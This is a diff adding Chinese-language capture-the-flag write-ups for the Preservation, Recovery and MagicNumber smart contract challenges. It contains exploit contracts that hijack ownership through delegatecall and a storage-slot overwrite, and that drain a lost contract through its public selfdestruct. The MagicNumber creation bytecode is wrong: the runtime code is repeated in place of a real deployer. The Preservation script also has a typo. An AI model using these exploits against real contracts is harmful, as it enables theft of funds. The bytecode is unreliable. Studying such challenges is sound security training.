@@ -843,3 +843,266 @@ contract NaughtCoin is ERC20 {
 await contract.approve(player, toWei("1000000"))
 await contract.transferFrom(player, instance, toWei("1000000"))
 ```
+
+# Preservation
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+    
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+- 这道题的核心在于利用delegatecall的上下文保留机制，通过调用外部合约代码来操作当前合约的存储布局，从而实现攻击目标。delegatecall 修改的本质上是 Preservation 中的变量。
+
+首先需要理解 Preservation 合约的存储结构：
+- timeZone1Library - 存储在 slot 0
+- timeZone2Library - 存储在 slot 1
+- owner - 存储在 slot 2
+- storedTime - 存储在 slot 3
+
+在 LibraryContract 中，只有一个状态变量： storedTime - 存储在 slot 0。setTime 实际上修改的是 address public timeZone1Library。
+
+编写并部署一个恶意合约 MaliciousLibrary，该合约与 LibraryContract 有相同的函数签名 setTime(uint256)，但它将操作 Preservation 合约的存储槽 2（即 owner 变量），并将 owner 替换为攻击者的地址。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MaliciousLibrary {
+    function setTime(uint256) public {
+        address attacker = address(uint160(msg.sender));
+        assembly {
+            sstore(2, attacker) // sstore(slot, value)，使用 sstore 可以绕过 Solidity 对变量访问的限制，例如在没有声明对应的状态变量时直接修改存储槽的值。
+        }
+    }
+}
+```
+
+```js
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7")
+await contract.timeZone1Library()
+// 0x6b14047235Ae884f97bb15aba68d40D951A2a9F7
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7") // 随便传参数反正不会用
+await contrcat.owner()
+```
+- 除了上面的 sstore 之外，也可以在攻击合约里模仿 Preservation 的变量定义然后直接修改对应的 owner 变量；
+
+# Recovery
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Recovery {
+    //generate tokens
+    function generateToken(string memory _name, uint256 _initialSupply) public {
+        new SimpleToken(_name, msg.sender, _initialSupply);
+    }
+}
+
+contract SimpleToken {
+    string public name;
+    mapping(address => uint256) public balances;
+
+    // constructor
+    constructor(string memory _name, address _creator, uint256 _initialSupply) {
+        name = _name;
+        balances[_creator] = _initialSupply;
+    }
+
+    // collect ether in return for tokens
+    receive() external payable {
+        balances[msg.sender] = msg.value * 10;
+    }
+
+    // allow transfers of tokens
+    function transfer(address _to, uint256 _amount) public {
+        require(balances[msg.sender] >= _amount);
+        balances[msg.sender] = balances[msg.sender] - _amount;
+        balances[_to] = _amount;
+    }
+
+    // clean up after ourselves
+    function destroy(address payable _to) public {
+        selfdestruct(_to);
+    }
+}
+```
+要解决这个问题，我们需要从由 Recovery 合约部署的丢失的 SimpleToken 合约中取回 0.001 ether。关键步骤如下：
+- 理解合约地址如何生成：当一个合约使用 CREATE 操作码（在 Solidity 中通过 new 关键字）创建另一个合约时，新合约的地址是根据创建者的地址和他们当时的 nonce（交易次数）确定性计算出来的。
+- 计算丢失合约的地址：因为 SimpleToken 合约是 Recovery 合约创建的第一个（也是唯一一个）合约，所以当时的 nonce 是 1。我们可以利用这个信息和 Recovery 合约的地址来计算丢失的合约地址。
+```solidity
+function computeLostContractAddress(address _creator, uint _nonce) public pure returns (address) {
+    bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, uint8(_nonce));
+    bytes32 hash = keccak256(data);
+    return address(uint160(uint(hash)));
+}
+```
+或者
+```js
+const ethers = require('ethers');
+
+const recoveryAddress = '0xYourRecoveryContractAddress';
+const nonce = 1;
+
+const computedAddress = ethers.utils.getContractAddress({
+    from: recoveryAddress,
+    nonce: nonce
+});
+
+console.log('丢失的 SimpleToken 合约地址:', computedAddress);
+```
+- 与丢失的合约交互：一旦我们知道了地址，就可以与 SimpleToken 合约交互。由于 destroy 函数是公共的，我们可以调用它来触发 selfdestruct，将合约持有的以太币发送到我们指定的地址。
+
+此外，也可以在 etherscan 上找到合约地址：0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64 和上面的函数计算结果一致。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
+contract Attack {
+    function attack() public {
+        address payable to = payable(address(0xA5d69166aD38B3403FE7894B0FBDA83A6026767C));
+        ISimpleToken(payable(0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64)).destroy(to);
+    }
+}
+```
+
+补充：地址计算的 RLP 编码 keccack256(RLP_encode(address, nonce))，这里的 nonce 从 1 开始计算（因为合约自身创建 nonce 从变为了 1）
+```
+[
+  0xC0
+    + 1 (a byte for string length) 
+    + 20 (string length itself) 
+    + 1 (nonce), 
+  0x80
+    + 20 (string length),
+  <20 byte string>,
+  <1 byte nonce>
+]
+
+[0xD6, 0x94, <challengeInstance>, 0x01]
+```
+
+# MagicNumber
+- 这道题有点难，看 wp 学习的，不会手写 Opcode。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MagicNum {
+    address public solver;
+
+    constructor() {}
+
+    function setSolver(address _solver) public {
+        solver = _solver;
+    }
+
+    /*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+    */
+}
+```
+题目要求我们实现一个可以在 whatIsTheMeaningOfLife() 调用时返回正确的 32 字节数的合约【注释里提示了是42】，同时限制代码长度。这个题需要写一个 solver 合约，最多10字节（如果通过solidity写一个function也会超过10个字节）。题目提示我们需要离开 solidity 直接写 EVM Opcode 来满足功能。
+
+部署合约的字节码进一步可以分为：Creation Code（不包含进合约内，仅部署时执行）、Runtime Code。Constructor 中的逻辑就在 Creation Code。
+
+对于 Creation Code：
+- OPCODE: 0x60  NAME: PUSH1
+- OPCODE: 0x52  NAME: MSTORE
+- OPCODE: 0xf3  NAME: RETURN
+- OPCODE: 0x39  NAME: CODECOPY
+
+
+先构造 runtime code：目标是返回42即(0x2a),需要用到 return(p,s) 操作码，p是回传值在memory中的位置，s是回传值的大小，所以0x2a需要先存到memory中然后再return，于是用到 MSTORE(p,v)。
+```
+PUSH1 0x2a
+PUSH1 0x80 // 这里可以是任意值，通常 solidity 编译出的 opcode 这里是 0x80，因为之前的位置有别的用途，但手写 opcode 无所谓了
+MSTORE
+
+PUSH1 0x20 // 32 bytes - RETURN(p,s) - s - size
+PUSH1 0x80 // p - 上面 mstore 的地址
+RETURN
+```
+翻译成opcode：`602a60805260206080f3` 20 chars 刚好 10 bytes 
+
+然后写 creation code。需要完成的操作有：将 runtime code 加载到内存中，然后返回给 EVM。CODECOPY 操作码可以实现这个功能，CODECOPY(d,p,s) 需要三个参数：runtime code position in memory，current position of runtime opcode in the bytecode 和 size of the code in bytes。 回传给 EVM 需要用到： return(p,s);
+
+故构造如下：
+```
+PUSH1 s // 0x0a - 10 bytes - size of runtime opcode 和前面的 code 长度一致
+PUSH1 p // 
+PUSH1 d // dst position: 0x00 可以随便设
+CODECOPY
+// CODECOPY(d,p,s)
+PUSH1 s // 和上面一致 0x0a
+PUSH1 p // 和上面一致 0x00
+RETURN
+// return(p,s)
+```
+
+翻译成 bytecode:
+```
+602a60805260206080f3
+```
+组合一下：
+```
+602a60805260206080f3 + 602a60805260206080f3
+602a60805260206080f3602a60805260206080f3
+```
+
+部署：
+```solidity
+bytecode = "602a60805260206080f3602a60805260206080f3"
+txn = await web3.eth.sendTransaction({from: player, data: bytecode})
+await contract.setSolver(txn.contractAddress)
+```
+这里不止一种构造方式。
+
+参考资料：
+- [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
+- [https://www.evm.codes/playground](https://www.evm.codes/playground)
